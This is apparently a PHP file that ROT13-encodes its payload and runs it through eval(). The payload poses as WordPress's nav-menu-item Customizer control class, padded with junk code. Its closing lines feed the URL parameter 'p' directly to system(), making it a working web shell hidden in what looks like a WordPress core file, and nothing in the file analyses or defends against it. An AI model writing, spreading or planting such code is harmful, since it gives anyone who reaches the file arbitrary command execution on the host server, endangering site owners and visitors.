<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Ani_Zrah_Vgrz_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr pbageby gb ercerfrag gur anzr svryq sbe n tvira zrah.
 *
 * @fvapr 4.3.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Ani_Zrah_Vgrz_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Pbageby glcr.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'ani_zrah_vgrz';

	/**
	 * Gur ani zrah vgrz frggvat.
	 *
	 * @fvapr 4.3.0
	 * @ine JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat
	 */
	choyvp $frggvat;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::__pbafgehpg()
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      Gur pbageby VQ.
	 * @cnenz neenl                $netf    Bcgvbany. Nethzragf gb bireevqr pynff cebcregl qrsnhygf.
	 *                                      Frr JC_Phfgbzvmr_Pbageby::__pbafgehpg() sbe vasbezngvba
	 *                                      ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $znantre, $vq, $netf = neenl() ) {
		cnerag::__pbafgehpg( $znantre, $vq, $netf );
	}

	/**
	 * Qba'g eraqre gur pbageby'f pbagrag - vg'f eraqrerq jvgu n WF grzcyngr.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * WF/Haqrefpber grzcyngr sbe gur pbageby HV.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		?>
		<qvi pynff=\"zrah-vgrz-one\">
			<qvi pynff=\"zrah-vgrz-unaqyr\">
				<fcna pynff=\"vgrz-glcr\" nevn-uvqqra=\"gehr\">{{ qngn.vgrz_glcr_ynory }}</fcna>
				<fcna pynff=\"vgrz-gvgyr\" nevn-uvqqra=\"gehr\">
					<fcna pynff=\"fcvaare\"></fcna>
					<fcna pynff=\"zrah-vgrz-gvgyr<# vs ( ! qngn.gvgyr && ! qngn.bevtvany_gvgyr ) { #> ab-gvgyr<# } #>\">{{ qngn.gvgyr || qngn.bevtvany_gvgyr || jc.phfgbzvmr.Zrahf.qngn.y10a.hagvgyrq }}</fcna>
					<# vs ( 0 === qngn.qrcgu ) { #>
						<fcna pynff=\"vf-fhozrah\" fglyr=\"qvfcynl: abar;\"><?cuc _r( 'fho vgrz' ); ?></fcna>
					<# } ryfr { #>
						<fcna pynff=\"vf-fhozrah\"><?cuc _r( 'fho vgrz' ); ?></fcna>
					<# } #>
				</fcna>
				<fcna pynff=\"vgrz-pbagebyf\">
					<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax vgrz-rqvg\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
					<# vs ( 0 === qngn.qrcgu ) { #>
						<?cuc
						/* genafyngbef: 1: Gvgyr bs n zrah vgrz, 2: Glcr bs n zrah vgrz. 3: Vgrz vaqrk, 4: Gbgny vgrzf. */
						cevags( __( 'Rqvg %1$f (%2$f, %3$q bs %4$q)' ), '{{ qngn.gvgyr || qngn.bevtvany_gvgyr || jc.phfgbzvmr.Zrahf.qngn.y10a.hagvgyrq }}', '{{ qngn.vgrz_glcr_ynory }}', '', '' );
						?>
					<# } ryfr vs ( 1 === qngn.qrcgu ) { #>
						<?cuc
							/* genafyngbef: 1: Gvgyr bs n zrah vgrz, 2: Glcr bs n zrah vgrz, 3, Vgrz vaqrk, 4, Gbgny vgrzf, 5: Vgrz cnerag. */
							cevags( __( 'Rqvg %1$f (%2$f, fho-vgrz %3$q bs %4$q haqre %5$f)' ), '{{ qngn.gvgyr || qngn.bevtvany_gvgyr || jc.phfgbzvmr.Zrahf.qngn.y10a.hagvgyrq }}', '{{ qngn.vgrz_glcr_ynory }}', '', '', '' );
						?>
					<# } ryfr { #>
						<?cuc
							/* genafyngbef: 1: Gvgyr bs n zrah vgrz, 2: Glcr bs n zrah vgrz, 3, Vgrz vaqrk, 4, Gbgny vgrzf, 5: Vgrz cnerag, 6: Vgrz qrcgu. */
							cevags( __( 'Rqvg %1$f (%2$f, fho-vgrz %3$q bs %4$q haqre %5$f, yriry %6$f)' ), '{{ qngn.gvgyr || qngn.bevtvany_gvgyr || jc.phfgbzvmr.Zrahf.qngn.y10a.hagvgyrq }}', '{{ qngn.vgrz_glcr_ynory }}', '', '', '', '{{qngn.qrcgu}}' );
						?>
					<# } #>
					</fcna><fcna pynff=\"gbttyr-vaqvpngbe\" nevn-uvqqra=\"gehr\"></fcna></ohggba>
					<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax vgrz-qryrgr fhozvgqryrgr qryrgvba\"><fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
						/* genafyngbef: 1: Gvgyr bs n zrah vgrz, 2: Glcr bs n zrah vgrz. */
						cevags( __( 'Erzbir Zrah Vgrz: %1$f (%2$f)' ), '{{ qngn.gvgyr || qngn.bevtvany_gvgyr || jc.phfgbzvmr.Zrahf.qngn.y10a.hagvgyrq }}', '{{ qngn.vgrz_glcr_ynory }}' );
					?>
					</fcna></ohggba>
				</fcna>
			</qvi>
		</qvi>

		<qvi pynff=\"zrah-vgrz-frggvatf\" vq=\"zrah-vgrz-frggvatf-{{ qngn.zrah_vgrz_vq }}\">
			<# vs ( 'phfgbz' === qngn.vgrz_glcr ) { #>
			<c pynff=\"svryq-hey qrfpevcgvba qrfpevcgvba-guva\">
				<ynory sbe=\"rqvg-zrah-vgrz-hey-{{ qngn.zrah_vgrz_vq }}\">
					<?cuc _r( 'HEY' ); ?><oe />
					<vachg pynff=\"jvqrsng pbqr rqvg-zrah-vgrz-hey\" glcr=\"grkg\" vq=\"rqvg-zrah-vgrz-hey-{{ qngn.zrah_vgrz_vq }}\" anzr=\"zrah-vgrz-hey\" />
				</ynory>
			</c>
		<# } #>
			<c pynff=\"qrfpevcgvba qrfpevcgvba-guva\">
				<ynory sbe=\"rqvg-zrah-vgrz-gvgyr-{{ qngn.zrah_vgrz_vq }}\">
					<?cuc _r( 'Anivtngvba Ynory' ); ?><oe />
					<vachg glcr=\"grkg\" vq=\"rqvg-zrah-vgrz-gvgyr-{{ qngn.zrah_vgrz_vq }}\" cynprubyqre=\"{{ qngn.bevtvany_gvgyr }}\" pynff=\"jvqrsng rqvg-zrah-vgrz-gvgyr\" anzr=\"zrah-vgrz-gvgyr\" />
				</ynory>
			</c>
			<c pynff=\"svryq-yvax-gnetrg qrfpevcgvba qrfpevcgvba-guva\">
				<ynory sbe=\"rqvg-zrah-vgrz-gnetrg-{{ qngn.zrah_vgrz_vq }}\">
					<vachg glcr=\"purpxobk\" vq=\"rqvg-zrah-vgrz-gnetrg-{{ qngn.zrah_vgrz_vq }}\" pynff=\"rqvg-zrah-vgrz-gnetrg\" inyhr=\"_oynax\" anzr=\"zrah-vgrz-gnetrg\" />
					<?cuc _r( 'Bcra yvax va n arj gno' ); ?>
				</ynory>
			</c>
			<c pynff=\"svryq-gvgyr-nggevohgr svryq-ngge-gvgyr qrfpevcgvba qrfpevcgvba-guva\">
				<ynory sbe=\"rqvg-zrah-vgrz-ngge-gvgyr-{{ qngn.zrah_vgrz_vq }}\">
					<?cuc _r( 'Gvgyr Nggevohgr' ); ?><oe />
					<vachg glcr=\"grkg\" vq=\"rqvg-zrah-vgrz-ngge-gvgyr-{{ qngn.zrah_vgrz_vq }}\" pynff=\"jvqrsng rqvg-zrah-vgrz-ngge-gvgyr\" anzr=\"zrah-vgrz-ngge-gvgyr\" />
				</ynory>
			</c>
			<c pynff=\"svryq-pff-pynffrf qrfpevcgvba qrfpevcgvba-guva\">
				<ynory sbe=\"rqvg-zrah-vgrz-pynffrf-{{ qngn.zrah_vgrz_vq }}\">
					<?cuc _r( 'PFF Pynffrf' ); ?><oe />
					<vachg glcr=\"grkg\" vq=\"rqvg-zrah-vgrz-pynffrf-{{ qngn.zrah_vgrz_vq }}\" pynff=\"jvqrsng pbqr rqvg-zrah-vgrz-pynffrf\" anzr=\"zrah-vgrz-pynffrf\" />
				</ynory>
			</c>
			<c pynff=\"svryq-ksa qrfpevcgvba qrfpevcgvba-guva\">
				<ynory sbe=\"rqvg-zrah-vgrz-ksa-{{ qngn.zrah_vgrz_vq }}\">
					<?cuc _r( 'Yvax Eryngvbafuvc (KSA)' ); ?><oe />
					<vachg glcr=\"grkg\" vq=\"rqvg-zrah-vgrz-ksa-{{ qngn.zrah_vgrz_vq }}\" pynff=\"jvqrsng pbqr rqvg-zrah-vgrz-ksa\" anzr=\"zrah-vgrz-ksa\" />
				</ynory>
			</c>
			<c pynff=\"svryq-qrfpevcgvba qrfpevcgvba qrfpevcgvba-guva\">
				<ynory sbe=\"rqvg-zrah-vgrz-qrfpevcgvba-{{ qngn.zrah_vgrz_vq }}\">
					<?cuc _r( 'Qrfpevcgvba' ); ?><oe />
					<grkgnern vq=\"rqvg-zrah-vgrz-qrfpevcgvba-{{ qngn.zrah_vgrz_vq }}\" pynff=\"jvqrsng rqvg-zrah-vgrz-qrfpevcgvba\" ebjf=\"3\" pbyf=\"20\" anzr=\"zrah-vgrz-qrfpevcgvba\">{{ qngn.qrfpevcgvba }}</grkgnern>
					<fcna pynff=\"qrfpevcgvba\"><?cuc _r( 'Gur qrfpevcgvba jvyy or qvfcynlrq va gur zrah vs gur npgvir gurzr fhccbegf vg.' ); ?></fcna>
				</ynory>
			</c>

			<?cuc
			/**
			 * Sverf ng gur raq bs gur sbez svryq grzcyngr sbe ani zrah vgrzf va gur phfgbzvmre.
			 *
			 * Nqqvgvbany svryqf pna or eraqrerq urer naq znantrq va WninFpevcg.
			 *
			 * @fvapr 5.4.0
			 */
			qb_npgvba( 'jc_ani_zrah_vgrz_phfgbz_svryqf_phfgbzvmr_grzcyngr' );
			?>

			<qvi pynff=\"zrah-vgrz-npgvbaf qrfpevcgvba-guva fhozvgobk\">
				<# vs ( ( 'cbfg_glcr' === qngn.vgrz_glcr || 'gnkbabzl' === qngn.vgrz_glcr ) && '' !== qngn.bevtvany_gvgyr ) { #>
				<c pynff=\"yvax-gb-bevtvany\">
					<?cuc
						/* genafyngbef: Ani zrah vgrz bevtvany gvgyr. %f: Bevtvany gvgyr. */
						cevags( __( 'Bevtvany: %f' ), '<n pynff=\"bevtvany-yvax\" uers=\"{{ qngn.hey }}\">{{ qngn.bevtvany_gvgyr }}</n>' );
					?>
				</c>
				<# } #>

				<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax ohggba-yvax-qryrgr vgrz-qryrgr fhozvgqryrgr qryrgvba\"><?cuc _r( 'Erzbir' ); ?></ohggba>
				<fcna pynff=\"fcvaare\"></fcna>
			</qvi>
			<vachg glcr=\"uvqqra\" anzr=\"zrah-vgrz-qo-vq[{{ qngn.zrah_vgrz_vq }}]\" pynff=\"zrah-vgrz-qngn-qo-vq\" inyhr=\"{{ qngn.zrah_vgrz_vq }}\" />
			<vachg glcr=\"uvqqra\" anzr=\"zrah-vgrz-cnerag-vq[{{ qngn.zrah_vgrz_vq }}]\" pynff=\"zrah-vgrz-qngn-cnerag-vq\" inyhr=\"{{ qngn.cnerag }}\" />
		</qvi><!-- .zrah-vgrz-frggvatf-->
		<hy pynff=\"zrah-vgrz-genafcbeg\"></hy>
		<?cuc
	}

	/**
	 * Erghea cnenzrgref sbe guvf pbageby.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea neenl Rkcbegrq cnenzrgref.
	 */
	choyvp shapgvba wfba() {
		$rkcbegrq                 = cnerag::wfba();
		$rkcbegrq['zrah_vgrz_vq'] = $guvf->frggvat->cbfg_vq;

		erghea $rkcbegrq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>